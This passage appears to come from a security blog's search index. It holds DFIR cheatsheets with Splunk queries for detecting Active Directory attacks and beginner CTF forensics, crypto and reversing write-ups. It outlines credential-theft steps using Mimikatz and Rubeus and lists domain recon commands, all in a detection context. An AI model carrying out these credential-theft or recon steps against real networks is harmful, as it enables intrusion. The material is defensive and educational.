host maxspan=1m endswith=(EventCode=4624) startswith=(EventCode=10)\n| stats count by _time, Computer, SourceImage, SourceProcessId, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process\n| fields - count\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-key/","title":"Detecting Overpass-the-Hash/Pass-the-Key","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-key/#attack-steps","title":"Attack Steps","text":"<ol> <li>Use Mimikatz to extract NTLM hash of current logged on user in compromised system (local admin priv required)</li> <li>Use Rubeus to craft AS-REQ request for a specific user to request a TGT ticket (does not require elevated priv)</li> <li>Analogous to the Pass-the-Ticket technique, the attacker submits the requested ticket for the current logon session</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-key/#detection","title":"Detection","text":"<p>Attack using <code>Mimikatz</code> leaves the same artifacts as Pass-the-Hash attack, hence it can be detected using the same strategies. However, attack using <code>Rubeus</code> is different. Unless the requested TGT is used on another host, Pass-the-Ticket detection mechanisms may not be effective, as Rubeus sends an AS-REQ request directly to the Domain Controller (DC), generating\u00a0Event ID 4768 (Kerberos TGT Request). However, communication with the DC (TCP/UDP port 88) from an unusual process can serve as an indicator of a potential Overpass-the-Hash attack.</p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-key/#splunk-query","title":"Splunk Query","text":"<pre><code>index=main source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1\n| eventstats values(process) as process by process_id\n| where EventCode=3\n| stats count by _time, Computer, dest_ip, dest_port, Image, process\n| fields - count\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-ticket/","title":"Detecting Pass-the-Ticket","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-ticket/#attack-steps","title":"Attack Steps","text":"<ol> <li>Attacker gains admin access</li> <li>Use tools like <code>Mimikatz</code> or <code>Rubeus</code> to extract valid TGT or TGS from compromised system</li> <li>Attacker submits the extracted ticket for current logon session</li> </ol>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-ticket/#detection","title":"Detection","text":"<p>When Pass-the-Ticket is executed, the Kerberos Authentication process will be partial.</p> <p>For example, an attacker imports a TGT ticket into a logon session and requests a TGS ticket for a remote service. From the Domain Controller perspective, the imported TGT was never requested before from the attacker\u2019s system, so there won't be an associated Event ID 4768.</p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/pass-the-ticket/#splunk-query","title":"Splunk Query","text":"<pre><code>index=main source=\"WinEventLog:Security\" user!=*$ EventCode IN (4768,4769,4770) \n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip_4&gt;[0-9\\.]+)\"\n| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)\n| where closed_txn=0\n| search NOT user=\"*$@*\"\n| table _time, ComputerName, username, src_ip_4, service_name, category\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/recon/","title":"Detecting Common User/Domain Recon","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/recon/#common-commands-used-for-userdomain-recon-using-native-windows-executable","title":"Common Commands Used for User/Domain Recon Using Native Windows Executable","text":"<ul> <li><code>whoami /all</code></li> <li><code>wmic computersystem get domain</code></li> <li><code>net user /domain</code></li> <li><code>net group \"Domain Admins\" /domain</code></li> <li><code>arp -a</code></li> <li><code>nltest /domain_trusts</code></li> </ul>"},{"location":"cheatsheets/dfir/detect-ad-attacks/recon/#splunk-query","title":"Splunk Query","text":"<pre><code>index=main source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventID=1\n| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) \n     OR (process_name IN (cmd.exe,powershell.exe) \n     AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))\n| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user\n| where mvcount(process) &gt; 3\n</code></pre> <p>Explanation:</p> Query Description <code>process_name</code> Search for process name which is either CMD or PowerShell which contains specific substrings. <code>mvcount(process) &gt; 3</code> Filter the results to only include the data when <code>process</code> field is greater than 3. This step is looking for instances where more than 3 processes were executed by the same parent process (might be process of gathering information - recon)."},{"location":"cheatsheets/dfir/detect-ad-attacks/recon/#analysis-of-userdomain-recon-using-bloodhoundsharphound","title":"Analysis of User/Domain Recon Using BloodHound/SharpHound","text":"<p>Info</p> <p>SharpHound is a C# collector for BloodHound.</p> <ul> <li>Windows Event ID 1644 - A client issued a search operation with the following options.</li> <li>List of LDAP filters frequently used by reconnaissance tools </li> </ul>"},{"location":"cheatsheets/dfir/detect-ad-attacks/recon/#splunk-query_1","title":"Splunk Query","text":"<pre><code>index=main source=\"WinEventLog:SilkService-Log\"\n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter\n| sort 0 _time\n| search SearchFilter=\"*(samAccountType=805306368)*\"\n| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId\n| where count &gt; 10\n| convert ctime(maxTime)\n</code></pre> <p>Explanation:</p> Query Description <code>spath input=Message</code> The\u00a0spath\u00a0command is used to extract fields from the\u00a0Message\u00a0field, which likely contains structured data such as\u00a0XML\u00a0or\u00a0JSON. The\u00a0spath\u00a0command automatically identifies and extracts fields based on the data structure. <code>search SearchFilter=\"*(samAccountType=805306368)*\"</code> Filter the results to only include the data when <code>SearchFilter</code> field contains the string <code>*(samAccountType=805306368)*</code> (user object in Active Directory). This query is used to search for related LDAP queries that contains user object."},{"location":"cheatsheets/dfir/detect-ad-attacks/responder/","title":"Detecting Responder-like Attacks","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/responder/#search-by-sysmon-event-id-22","title":"Search by Sysmon Event ID 22","text":"<p>We can use <code>Sysmon Event ID 22</code> to track the DNS queries associated with non-existent or mistyped file shares to detect possible Responder-like attacks.</p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/responder/#splunk-query","title":"Splunk Query","text":"<pre><code>index=main EventCode=22 \n| table _time, Computer, user, Image, QueryName, QueryResults\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/responder/#search-by-windows-event-id-4648","title":"Search by Windows Event ID 4648","text":"<p>We can also use <code>Windows Security Event ID 4648 (A logon was attempted using explicit credentials.)</code> to detect explicit logons to rogue file shares which attackers might use to gather legitimate user credentials.</p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/responder/#splunk-query_1","title":"Splunk Query","text":"<pre><code>index=main EventCode IN (4648) \n| table _time, EventCode, source, name, user, Target_Server_Name, Message\n| sort 0 _time\n</code></pre>"},{"location":"cheatsheets/dfir/detect-ad-attacks/roasting/","title":"Detecting Kerberoasting/AS-REProasting","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/roasting/#kerberoasting","title":"Kerberoasting","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/roasting/#splunk-query","title":"Splunk Query","text":"<p>Detecting SPN Querying <pre><code>index=main source=\"WinEventLog:SilkService-Log\" \n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter \n| search SearchFilter=\"*(&amp;(samAccountType=805306368)(servicePrincipalName=*)*\"\n</code></pre></p> <p>Detecting TGS Requests <pre><code>index=main EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| bin span=2m _time \n| search username!=*$ \n| stats values(EventCode) as Events, values(service_name) as service_name, values(Additional_Information) as Additional_Information, values(Target_Server_Name) as Target_Server_Name by _time, username\n| where !match(Events,\"4648\")\n</code></pre></p> <p>Detecting TGS Requests (using <code>transaction</code>) <pre><code>index=main EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| search username!=*$ \n| transaction username keepevicted=true maxspan=5s endswith=(EventCode=4648) startswith=(EventCode=4769) \n| where closed_txn=0 AND EventCode = 4769\n| table _time, EventCode, service_name, username\n</code></pre></p>"},{"location":"cheatsheets/dfir/detect-ad-attacks/roasting/#as-reproasting","title":"AS-REProasting","text":""},{"location":"cheatsheets/dfir/detect-ad-attacks/roasting/#splunk-query_1","title":"Splunk Query","text":"<p>Detecting Queries of Accounts with Pre-auth Disabled <pre><code>index=main source=\"WinEventLog:SilkService-Log\" \n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter \n| search SearchFilter=\"*(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)*\"\n</code></pre></p> <p>Detecting TGT Requests for Accounts with Pre-auth Disabled <pre><code>index=main source=\"WinEventLog:Security\" EventCode=4768 Pre_Authentication_Type=0\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip&gt;[0-9\\.]+)\"\n| table _time, src_ip, user, Pre_Authentication_Type, Ticket_Options, Ticket_Encryption_Type\n</code></pre></p>"},{"location":"ctf/2023/aboh-2023/about/","title":"[ About ]","text":"<ul> <li>CTF Name: ASEAN Battle of Hackers (ABOH) 2023 </li> <li>Organizer: Forensics and Security Research Centre - Student Section (FSEC-SS), Asia Pacific University (APU)</li> </ul> Category Challenge Name Forensics Fur Elise Forensics SCP 2.0"},{"location":"ctf/2023/aboh-2023/fur-elise/","title":"Fur Elise","text":"<p>Powershell script deobfuscation</p>"},{"location":"ctf/2023/aboh-2023/fur-elise/#description","title":"Description","text":"<p>Beethoven was really pretty lol (read the section Beethoven Fur Elise: Fun facts): https://www.chosic.com/why-is-beethoven-fur-elise-so-popular-and-who-was-elise/  Attachment: <code>heartbroken</code></p>"},{"location":"ctf/2023/aboh-2023/fur-elise/#solution","title":"Solution","text":"<p>The file is given without any extension. I use <code>file</code> command to identify the file type. However, there is nothing useful about the file type. Therefore, I open the file in a text editor to see the contents of the file.</p> <p></p> <p>Upon opening the file, there are large chunks of repetitive words with some variables being set in the first few lines which immediately catched my attention. You will notice that it is a link as it contains \"https://...\" if you look closely.</p> <p></p> <p>By using CyberChef, we can remove the repetitive symbol \"&amp;\" to see the link clearly. The output shows a pastebin link which gives us half of the flag <code>ABOH23{d!ff1cU17_s0Ng</code>.</p> <p></p> <p>Scrolling through the <code>heartbroken</code> file again will see another suspicious link, which is a github gist link.</p> <p></p> <p>The encoded string was run using Powershell, so we can suspect that this is a Powershell script. However, it is encoded, so let's put it back to CyberChef to decode again.</p> <p></p> <p>The string is encoded by base64. Therefore, using <code>From Base64</code> we can decode the string. After that, we can decode UTF-16LE from the string as the default encoding for Powershell is UTF-16LE (source).</p> <p></p> <p>After decoding, we can see some strings that are suspectable. However, it seems like the string from the first box is just a string and is taking the characters and joining them together. We can see that there is a <code>$c2</code> variable. This normally stores the details of the C2 server and we can try analyzing this to see if there is any juicy info. I used ChatGPT to convert them back to ASCII and I believe there are much better ways to do this. Once decoded, we will get another pastebin link which contains another half of the flag.</p>"},{"location":"ctf/2023/aboh-2023/fur-elise/#flag","title":"Flag","text":"<p><code>ABOH23{d!ff1cU17_s0Ng_FROm_hEaRtBrE4K}</code></p>"},{"location":"ctf/2023/aboh-2023/scp-2/","title":"SCP 2.0","text":"<p>Memory analysis (using mftparser plugin)</p>"},{"location":"ctf/2023/aboh-2023/scp-2/#description","title":"Description","text":"<p>Site-19 has been breached by the Chaos Insurgency following the breach of Site-[REDACTED]. All personnel is required to follow Procedure-15A.</p> <p>Attachment: <code>Procedure-15A.pdf</code>, <code>memdump.raw</code></p>"},{"location":"ctf/2023/aboh-2023/scp-2/#solution-1","title":"Solution 1","text":"<p>The given PDF file contains the rules that should be followed by SCP Foundation. Another given file is a memory dump file which means that we have to do a memory analysis on it. I use Volatility 2 which can be found here.</p> <p><pre><code>vol.py -f memdump.raw imageinfo\n</code></pre> For Volatility 2, we have to choose the correct profile before starting to analyze the memory dump file. It needs to know what kind of system the memory dump file is from so that it can further analyze it and come out with the correct output (source). Therefore, we can use <code>imageinfo</code> to find the suggested profile.</p> <p></p> <p>There are several suggested profiles for this memory dump. We can try starting with the first suggested profile. If the output is unreadable, change another profile and try again.</p> <p><pre><code>vol.py -f memdump.raw --profile=Win7SP1x64 pslist\n</code></pre> Normally for memory dump analysis, the first thing that we will do is to analyze the processes of the system. <code>pslist</code> plugin shows all the processes ran in the system. However, do note that it does not show the hidden processes (<code>psscan</code> can show hidden processes).</p> <p></p> <p>Image above shows part of the pslist output. However, after analyzing all the processes, there are no malicious process that grabs our attention.</p>"},{"location":"ctf/2023/aboh-2023/scp-2/#reanalyzing-the-question","title":"Reanalyzing the question","text":"<p>The PDF file mentions data like documentation, images, and videos. This gives us an idea to search for available files in the memory.</p> <p><pre><code>vol.py -f memdump.raw --profile=Win7SP1x64 filescan\n</code></pre> We can use <code>filescan</code> command to list all the files. However, if we run this command, there will be a lot of output, and it takes time to go through. In DFIR, analyzing is about knowing what to search for and narrowing your scope. Since \"documentation\" is mentioned, we can try to search for documents, or \"doc\". <pre><code>vol.py -f memdump.raw --profile=Win7SP1x64 filescan | grep -i doc\n</code></pre> We can try to use <code>grep</code> command to search for strings, and <code>-i</code> allows us to search for strings case-insensitively so that it can show both uppercase and lowercase outputs.</p> <p></p> <p>Based on the output, <code>SCP-055.doc</code> looks suspicious. We can try to dump it out and see what's inside.</p> <p><pre><code>vol.py -f memdump.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001f6bbb70 --dump-dir=&lt;YOUR_DIR_HERE&gt;\n</code></pre> We can use <code>dumpfiles</code>command to dump the file by specifying the physical address using <code>-Q</code> and the output directory using <code>--dump-dir</code>.</p> <p><pre><code>mv file.None.0xfffffa80091d29f0.dat SCP-055.doc\n</code></pre> Then, go to the output directory and rename the file.</p> <p><pre><code>strings SCP-055.doc\n</code></pre> After trying several methods to view the file, we will find out that we can view it using strings command.</p> <p></p> <p>We can see that there is a <code>flag.txt</code> file, but we have no clue how to get it. Let's reanalyze the question again.</p>"},{"location":"ctf/2023/aboh-2023/scp-2/#reanalyzing-the-question-2","title":"Reanalyzing the question 2","text":"<p>Looking back on the PDF file, we can see that it says all data must be eradicated (removed). This kind of gives us a hint where we can try to search for deleted files.</p> <p><pre><code>vol.py -f memdump.raw --profile=Win7SP1x64 mftparser &gt; mft.txt\n</code></pre> We can scan for deleted files using <code>mftparser</code>. However, there will be a large chunk of output so I chose to save the output in <code>mft.txt</code> file.</p> <p></p> <p>However, we are still unable to get anything if we find for \"flag.txt\".  Therefore, we can try searching for only \"txt\".</p> <p></p> <p>This file was found in Recycle Bin and we are able to read the content of the file. The content has a long and suspicious string which seems to be a base64 encoded string.</p> <p>Tip</p> <p>In CTF competitions, whenever there is base64 encoded string, decode it might give you a surprise!</p> <p></p> <p>Decode it and we will get the flag.</p>"},{"location":"ctf/2023/aboh-2023/scp-2/#solution-2","title":"Solution 2","text":"<p>After the competition, the challenge creator gave me another solution which I think is a faster way to search for the file. Since it is about deleted file, we can try to search for Recycle Bin.</p> <p></p> <p>Thanks to the challenge creator who gave me a better solution!</p>"},{"location":"ctf/2023/aboh-2023/scp-2/#flag","title":"Flag","text":"<p><code>ABOH23{C0NT41nm3Nt_Breach_8Y_M@cr0$}</code></p>"},{"location":"ctf/2023/gctf-2023/about/","title":"[ About ]","text":"<ul> <li>CTF Name: Girls in CTF 2023 </li> <li>Organizer: RE:HACK</li> <li>Description: It is a beginner-friendly CTF competition that aims to identify the local female talents in cybersecurity.</li> </ul> <p>Here's the link to my teammate's writeup (who solved Pwn Level 1-4 wohooooo): https://blog.yenwai.com/ctf/gctf-2023</p> Category Challenge Name Cryptography RSA Forensics Broken Forensics Wireshark #1 Forensics Wireshark #2 Forensics History Forensics KB Miscellaneous Frequency Miscellaneous Office Miscellaneous Master Hidden Within the Slides Reverse Engineering PNG"},{"location":"ctf/2023/gctf-2023/broken/","title":"Broken","text":"<p>Corrupted PDF</p>"},{"location":"ctf/2023/gctf-2023/broken/#description","title":"Description","text":"<p>I got this pdf and it's very important to me. WHY CAN'T IT OPEN OMG!</p> <p>Attachment: <code>challenge.pdf</code></p>"},{"location":"ctf/2023/gctf-2023/broken/#solution","title":"Solution","text":"<p>The PDF file given is corrupted and the content cannot be read.</p> <p></p> <p>We can use <code>exiftool</code> to check the metadata of the file. There is a warning says that this file has an invalid xref table.</p> <p></p> <p>We can search the internet for online tools that can repair corrupted PDF files.</p> <p></p> <p>Once fixed, scroll through the PDF file and we will see the flag at the bottom of the file.</p>"},{"location":"ctf/2023/gctf-2023/broken/#flag","title":"Flag","text":"<p><code>GCTF2023{M3_4nd_my_Br0k3n_h3art}</code></p>"},{"location":"ctf/2023/gctf-2023/frequency/","title":"Frequency","text":"<p>Audio steganography - spectrogram</p>"},{"location":"ctf/2023/gctf-2023/frequency/#description","title":"Description","text":"<p>I can hear flag...I think....or I am insane?  Attachment: <code>challenge.wav</code></p>"},{"location":"ctf/2023/gctf-2023/frequency/#solution","title":"Solution","text":"<p>Listening to the audio file will give us some weird \"alien\" sound. There is no useful information from the audio. Therefore, we can try analyzing the audio using tools like Audacity or Sonic Visualizer.</p> <p>  Waveform of the audio does not give us any useful information. In audio steganography, most of the time people hide information in the spectrogram.  </p> <p>  Therefore, we can try to view the audio in spectrogram. Spectrogram is a visual representation of the frequency of a signal and the amplitude, which is useful for hiding information.  </p> <p>  This is the spectrogram of the audio, which shows the flag.  </p>"},{"location":"ctf/2023/gctf-2023/frequency/#flag","title":"Flag","text":"<p><code>GCTF2023{this_fl4g_sounds_weirddddddd}</code></p>"},{"location":"ctf/2023/gctf-2023/history/","title":"History","text":"<p>Browser forensics</p>"},{"location":"ctf/2023/gctf-2023/history/#description","title":"Description","text":"<p>I just got back my files from a corrupted hard drive and I need to find back my browser history, can you please help me to get it?</p> <p>File: https://drive.google.com/file/d/1XiVW7n5-U4nUQg7hyS9JwJ1Gge1a3OlB/view?usp=sharing  Password of the zip file: <code>GCTF2023</code></p>"},{"location":"ctf/2023/gctf-2023/history/#solution","title":"Solution","text":"<p>Since the challenge description mentioned browser history, we know that we should focus on searching the browser history and hunting for information (a.k.a. flag). </p> <p>When doing browser forensics, we have to know which is the location that we have to search for the file that we need. In a normal computer, browsing history are stored in the locations below: </p> <p>Google Chrome <pre><code>C:\\Users\\&lt;USERNAME&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\n</code></pre> Microsoft Edge <pre><code>C:\\Users\\&lt;USERNAME&gt;\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History\n</code></pre> </p> <p>Tip</p> <p>If you are not able to find AppData folder, make sure to check your settings and show all files/folders including the hidden items.</p> <p> </p> <p>After analysis (by going through the folders), we can see that there are both Google Chrome and Microsoft Edge. Since Google Chrome is commonly used, we can start with viewing its browsing history first.</p> <p></p> <p>Browser artifacts are normally stored in SQLite database. Hence, this is a SQLite file. We can use any online SQLite viewer like this website, or we can also use DB Browser for SQLite which is an open-source tool to view or edit SQLite database.  </p> <p></p> <p>We will see that there are many tables stored in the database. Table <code>urls</code> stores visited URLs, along with some information such as visit count and last visit time. However, we did not see any flags here. Let's go through other table. </p> <p></p> <p>Table <code>segments</code> stores the domain name of accessed URLs (source). The flag is located here.</p>"},{"location":"ctf/2023/gctf-2023/history/#flag","title":"Flag","text":"<p><code>GCTF2023{Chr0m1um_h1st0ry}</code></p>"},{"location":"ctf/2023/gctf-2023/kb/","title":"KB","text":"<p>USB keystroke in Wireshark</p>"},{"location":"ctf/2023/gctf-2023/kb/#description","title":"Description","text":"<p>Hmm, haven't seen this type of wireshark file in a while now.</p> <p>Attachment: <code>challenge.pcapng</code></p>"},{"location":"ctf/2023/gctf-2023/kb/#solution","title":"Solution","text":"<p>We were given a pcap file for this challenge. However, it has different protocols compared to what we normally see. </p> <p></p> <p>Note that the captured packets are using USB protocol. Since we are not familiar with this kind of packet capture, let's try to find for similar CTF writeups (if there's any).</p> <p></p> <p>We found some useful websites and videos for similar challenges. It says that we have to record all the keystrokes captured. </p> <p><pre><code>tshark -r challenge.pcapng -Y 'usb.capdata &amp;&amp; usb.data_len == 8' -T fields -e usb.capdata | sed\n's/../:&amp;/g2' &gt; keystrokes.txt\n</code></pre> We can use <code>tshark</code> to get the keystrokes we want.</p> <p></p> <p>Then we use a keystroke parser to parse all the keystroke and display it.</p>"},{"location":"ctf/2023/gctf-2023/kb/#flag","title":"Flag","text":"<p><code>GCTF2023{1nt3rc3pt1ng_keystr0k3}</code></p>"},{"location":"ctf/2023/gctf-2023/kb/#resources","title":"Resources","text":"<ul> <li>https://abawazeeer.medium.com/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4</li> <li>https://www.youtube.com/watch?v=EnOgRyio_9Q</li> </ul>"},{"location":"ctf/2023/gctf-2023/master-hidden-within-the-slides/","title":"Master Hidden Within the Slides","text":"<p>PowerPoint slide master</p>"},{"location":"ctf/2023/gctf-2023/master-hidden-within-the-slides/#description","title":"Description","text":"<p>Just made a presentation, with flag.</p> <p>Attachment: <code>challenge.pptx</code></p>"},{"location":"ctf/2023/gctf-2023/master-hidden-within-the-slides/#solution","title":"Solution","text":"<p>Hint is already given within the challenge title, which is slide master.</p> <p></p> <p>Slide master is a feature that allows us to control the format of the entire presentation (source). To go to slide master settings, go to <code>View</code> --&gt; <code>Slide Master</code>.</p> <p></p> <p>Scroll through all the slides and we will see a suspicious string.</p> <p></p> <p>Decode the string by using CyberChef and we will get the flag.</p>"},{"location":"ctf/2023/gctf-2023/master-hidden-within-the-slides/#flag","title":"Flag","text":"<p><code>GCTF{Sl1d3sss_M4staaaaaaa}</code></p>"},{"location":"ctf/2023/gctf-2023/office/","title":"Office","text":"<p>Format cell</p>"},{"location":"ctf/2023/gctf-2023/office/#description","title":"Description","text":"<p>I heard there are hidden information here, can you find it for me?</p> <p>Attachment: <code>challenge.xlsx</code></p>"},{"location":"ctf/2023/gctf-2023/office/#solution","title":"Solution","text":"<p>The given tab in the excel sheet does not give us any useful information. We can try to search for hidden tabs.</p> <p></p> <p>In Hidden3 tab, we will see that there are hidden texts in the cells. Changing the font colour or the fill colour will not help in revealing the text.</p> <p></p> <p>Therefore, we can select all cells to change the format of the cells.</p> <p></p> <p>Change the format to text so that the hidden text will be visible.</p> <p></p> <p>Once the hidden texts are shown, we can kind of see that it is a QR code. We can apply rules to the cells so that it will fill with colour automatically.</p> <p></p> <p>Image above shows the rules set by us to colour the cell.</p> <p></p> <p>Once the new rule is applied, a clear QR code will be shown and it will redirect us to the flag.</p>"},{"location":"ctf/2023/gctf-2023/office/#flag","title":"Flag","text":"<p><code>GCTF2023{F0rmatt1ng_c311s_t0_h1d3_inf0rm4t10n}</code></p>"},{"location":"ctf/2023/gctf-2023/png/","title":"PNG","text":"<p>ASCII code</p>"},{"location":"ctf/2023/gctf-2023/png/#description","title":"Description","text":"<p>Expressions.</p> <p>Attachment: <code>chal</code>, <code>flag-destroyed.png</code></p>"},{"location":"ctf/2023/gctf-2023/png/#solution","title":"Solution","text":"<p>When attempting a reverse engineering challenge, we can use <code>file</code> command to get more information of the given file. We can see that this file is a ELF executable file, and it is not stripped (which means that we can see the exact name of the functions of the program when we decompile it).</p> <p>Tip</p> <p>If the executable file is stripped, we will only see function names like FUNCTION_1337 when we decompile it.</p> <p>Then, we can run the command below to make it executable so that we can try to run it to get more information about the executable.</p> <pre><code>chmod +x chal\n</code></pre> <p></p> <p>This executable seems to require us to enter a key to continue. Wrong key will result in exiting the program. Since we have another file named <code>flag-destroyed.png</code>, we can assume that this executable can help us recover the \"destroyed\" PNG file.</p> <p></p> <p>Let's decompile it by opening it in IDA, and generating pseudocode for it.</p> <p></p> <p>There is no other interesting function that attracts our attention. Hence, we can focus on the main function. We can see that there is an if-statement being used, and it compares some data with each of the variables. </p> <p></p> <p>The decimal is the decimal representation of a character. Convert it to ASCII character using the shortcut <code>R</code> and we can see part of the key. You can basically guess the key for it by looking only this, but I will explain the proper way of solving this.</p> <p></p> <p>We can assume that v12 has the same value as v14. However, v13 (which is supposed to be in between v12 and v14) somehow disappear (which I don't know why either). Let's just assume v13 is there in between v12 and v14 first.</p> <p></p> <p>Next, we have these two variables. Since the key is almost completed, we can try to assume that v24 is 'o'. According to ASCII table, 'o' has the value of 111. With this we can deduce that v12 has the value of 116.</p> <pre><code>v24 = v12 - 5\n111 = v12 - 5\nv12 = 111 + 5 = 116 = 't'\n</code></pre> <p></p> <p>Do this for all the remaining characters and we will get the correct key, which produces a new file named flag.png.</p> <p></p>"},{"location":"ctf/2023/gctf-2023/png/#flag","title":"Flag","text":"<p><code>GCTF2023{3xpr_l34d5_70_pn6}</code></p>"},{"location":"ctf/2023/gctf-2023/rsa/","title":"RSA","text":"<p>Basic RSA</p>"},{"location":"ctf/2023/gctf-2023/rsa/#description","title":"Description","text":"<p>Every CTF has RSA challenge.</p> <p>Attachment: <code>challenge.py</code></p> <p>Note</p> <p>It is encouraged to have a basic understanding of RSA encryption before solving this!</p>"},{"location":"ctf/2023/gctf-2023/rsa/#solution","title":"Solution","text":"<p>Given the source code:</p> <p><pre><code>from Crypto.Util.number import bytes_to_long, getPrime\n\nwith open(\"flag.txt\",'r') as f:\n    flag = f.read().strip()\n\nflag = bytes_to_long(flag.encode())\n\np = getPrime(1024)\nq = getPrime(1024)\nn = p*q\ne = 65537\nc = pow(flag,e,n)\n\nprint(f'n={n}')\nprint(f'p={p}')\nprint(f'c={c}')\n\n# n=15138047083336567387598404182117550531094679760081369569736673100835940614119297845724474328598653166682692035358124922093691226637190100662505454325397518583128761198861108433486661764566120192806515017361172003470479755673131103686416541000761949401411714006274727728179082530142674854344098633377634917375822347098405726105428537126400979220983824393630934242161943436579231485042987749145327379107056194186347264459118195219956940514076673315662396819409761346033025245958454058950121320337708219343872646349324376287708828282032716867999245556963140029186988131456310599586122979784177769970304120450653012512511\n# p=138159122583150122539720672416651109965259423750397803915903094495596812603681284787472112426702597936630836894327906061362978462737525528215392644981478718358749052442979545783775891762536479603911896809757160718820241487029878002523604067015936695506547062698224984758721835069593092375144244144620366872961\n# c=1453596642039151116086413588294421625111538325750688869393297447422986199873311576591406269261932213967119883516135438941788095024502918677407589460879677235723210412609001454986376121948201548608120904323444958939456420627636052032365803420545256681738481067122185206799862991406129261691011405505344276504766164166341017812076778442426876198929664548235013445421974512426707551989910605878929718470021555033308445317698061530848019576675720326051470316876972003948422471576781345019975660130395524998564859708066646547673944167524661953235771625088325779686474745263341018054771598275299015725925842283891824533202\n</code></pre> Given the values of <code>n</code>, <code>p</code> and <code>c</code>, we need to find the remaining variable which is d in order to decrypt the cipher. </p> <p>Below is the solution script:</p> <pre><code>from Cryptodome.Util.number import long_to_bytes, inverse\n\nn = 15138047083336567387598404182117550531094679760081369569736673100835940614119297845724474328598653166682692035358124922093691226637190100662505454325397518583128761198861108433486661764566120192806515017361172003470479755673131103686416541000761949401411714006274727728179082530142674854344098633377634917375822347098405726105428537126400979220983824393630934242161943436579231485042987749145327379107056194186347264459118195219956940514076673315662396819409761346033025245958454058950121320337708219343872646349324376287708828282032716867999245556963140029186988131456310599586122979784177769970304120450653012512511\np = 138159122583150122539720672416651109965259423750397803915903094495596812603681284787472112426702597936630836894327906061362978462737525528215392644981478718358749052442979545783775891762536479603911896809757160718820241487029878002523604067015936695506547062698224984758721835069593092375144244144620366872961\nc = 1453596642039151116086413588294421625111538325750688869393297447422986199873311576591406269261932213967119883516135438941788095024502918677407589460879677235723210412609001454986376121948201548608120904323444958939456420627636052032365803420545256681738481067122185206799862991406129261691011405505344276504766164166341017812076778442426876198929664548235013445421974512426707551989910605878929718470021555033308445317698061530848019576675720326051470316876972003948422471576781345019975660130395524998564859708066646547673944167524661953235771625088325779686474745263341018054771598275299015725925842283891824533202\n\nq = n // p\nphi = (p-1)*(q-1)\ne = 65537\nd = inverse(e,phi)\nm = pow(c,d,n)\nflag = long_to_bytes(m)\n\nprint(f\"Flag: {flag}\")\n</code></pre> <p>Floor division is used to find <code>q</code> so that it will return an integer instead of float. <code>long_to_bytes</code> function is used to convert the decrypted message (long integer) into bytes (readable message).</p>"},{"location":"ctf/2023/gctf-2023/rsa/#flag","title":"Flag","text":"<p><code>GCTF2023{S1mpl3_RSA_n0_pr3ssur3}</code></p>"},{"location":"ctf/2023/gctf-2023/wireshark-1/","title":"Wireshark 1","text":"<p>Search string within packets</p>"},{"location":"ctf/2023/gctf-2023/wireshark-1/#description","title":"Description","text":"<p>It's cleartext :3</p> <p>Attachment: <code>challenge.pcap</code></p>"},{"location":"ctf/2023/gctf-2023/wireshark-1/#solution","title":"Solution","text":""},{"location":"ctf/2023/gctf-2023/wireshark-1/#solution-1-search-string","title":"Solution 1: Search String","text":"<p>Since the challenge description says that the flag is in cleartext, we can straightaway search for the flag within the packets.</p> <p></p> <p><code>Edit</code> --&gt; <code>Find Packet</code></p> <p></p> <p>We can search for packet details that contain the string which is the flag format <code>gctf</code> and we will get the flag. </p>"},{"location":"ctf/2023/gctf-2023/wireshark-1/#solution-2-filter-data","title":"Solution 2: Filter Data","text":"<p>We can also use the filter to filter for text data to get the flag.</p>"},{"location":"ctf/2023/gctf-2023/wireshark-1/#flag","title":"Flag","text":"<p><code>GCTF{fl4g_in_tcpdump_ez}</code></p>"},{"location":"ctf/2023/gctf-2023/wireshark-2/","title":"Wireshark 2","text":"<p>Export HTTP 